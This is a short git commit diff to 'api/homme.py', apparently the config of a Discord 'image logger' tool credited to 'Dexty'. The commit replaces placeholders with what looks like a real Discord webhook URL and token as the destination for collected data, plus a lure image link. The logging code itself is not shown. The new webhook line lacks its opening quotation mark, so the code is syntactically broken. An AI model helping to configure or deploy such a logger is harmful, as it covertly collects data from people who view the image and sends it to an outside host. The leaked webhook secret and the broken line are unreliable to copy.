9fa4c0c02b8d9d4c711d6a10e2f05fc4b90e2f02
lougrah5-wq <lougrah5@gmail.com>
2025-10-04 17:47:45 +0200

    Update homme.py

--- api/homme.py
+++ api/homme.py
@@ -12,8 +12,8 @@ __author__ = "Dexty"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/your/webhook",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "webhook": https://discord.com/api/webhooks/1424059897506697257/XxvFsfqXzAPXBwbpKVOmJZk6rR2ft4RQv_59FdtoVo8BV2Jw1eYgLzRpHiYUkvQqEdp5",
+    "image": "https://cdn.wallpapersafari.com/68/19/j9EpPf.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
